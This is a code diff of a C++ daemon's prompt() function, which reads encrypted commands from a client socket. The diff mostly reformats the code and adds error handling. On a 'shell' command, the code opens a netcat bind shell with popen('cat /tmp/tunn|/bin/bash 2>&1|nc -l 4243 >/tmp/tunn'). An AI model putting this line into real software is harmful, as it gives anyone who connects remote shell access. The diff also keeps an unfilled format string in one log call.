@@ -206,55 +206,63 @@ void			search_i_in_csock(std::string msg, int r, char *buf)
 
 int	prompt(std::string msg, int r, char *buf)
 {
-  msg.clear();
-  r = read(env.csock[env.i].sock, buf, 512);
-  if (r <= 0)
-    {
-      if (r < 0)
-	call_tintin(FATAL, "read prompt");
-      else
+	msg.clear();
+	r = read(env.csock[env.i].sock, buf, 512);
+	errno = 0;
+	if (r <= 0)
 	{
-	  dprintf(1, "close clientt %d\n", env.total_client);
-	  close(env.csock[env.i].sock);
-	  env.csock[env.i].is_connect = 0;
-	  FD_CLR(env.csock[env.i].sock, &active_fd);
-	  env.total_client--;
-	  if (env.total_client <= 0)
-	    kill_daemon();
+		if (r < 0)
+			call_tintin(FATAL, "read prompt");
+		else
+		{
+			call_tintin(INFO, "close clientt %d\n");
+			close(env.csock[env.i].sock);
+			env.csock[env.i].is_connect = 0;
+			FD_CLR(env.csock[env.i].sock, &active_fd);
+			env.total_client--;
+			if (env.total_client <= 0)
+				kill_daemon();
+		}
+		return (1);
 	}
-      return (1);
-    }
-  msg = buf;
-  if (r > 0)
-    {
-      buf[r - 1] = '\0';
-      msg = decrypt(buf);
-    }
-  call_tintin(LOG, msg);
-  if (!msg.compare("?"))
-    menu();
-  else if (!msg.compare("shell"))
-    {
-      msg = "shell spawning in port 4243\n$>";
-      msg = encrypt(msg);
-      call_tintin(INFO, "Launch Shell on port 4243");
-      mkfifo("/tmp/tunn", 0644);
-      popen("cat /tmp/tunn|/bin/bash 2>&1|nc -l 4243 >/tmp/tunn", "r");
-      write(env.csock[env.i].sock, msg.c_str(), msg.length());
-    }
-  else if (!msg.compare("quit"))
-    {
-      kill_daemon();
-      return (1);
-    }
-  else
-    {
-      memset(buf, 0, r);
-      msg = "$>";
-      msg = encrypt(msg);
-      write(env.csock[env.i].sock, msg.c_str(), msg.length());
-    }
-  return (0);
+	msg = buf;
+	if (r > 0)
+	{
+		buf[r - 1] = '\0';
+		msg = decrypt(buf);
+	}
+	call_tintin(LOG, msg);
+	if (!msg.compare("?"))
+		menu();
+	else if (!msg.compare("shell"))
+	{
+		msg = "shell spawning in port 4243\n$>";
+		msg = encrypt(msg);
+		call_tintin(INFO, "Launch Shell on port 4243");
+		if (mkfifo("/tmp/tunn", 0644) < 0 && errno != EEXIST)
+		{
+			msg = encrypt("Shell is not working");
+			write(env.csock[env.i].sock, msg.c_str(), msg.length());
+		}
+		else
+		{
+			popen("cat /tmp/tunn|/bin/bash 2>&1|nc -l 4243 >/tmp/tunn", "r");
+			write(env.csock[env.i].sock, msg.c_str(), msg.length());	      
+		}
+	}
+	else if (!msg.compare("quit"))
+	{
+		kill_daemon();
+		return (1);
+	}
+	else
+	{
+		memset(buf, 0, r);
+		msg = "$>";
+		msg = encrypt(msg);
+		write(env.csock[env.i].sock, msg.c_str(), msg.length());
+	}
+	return (0);
 }
 
 
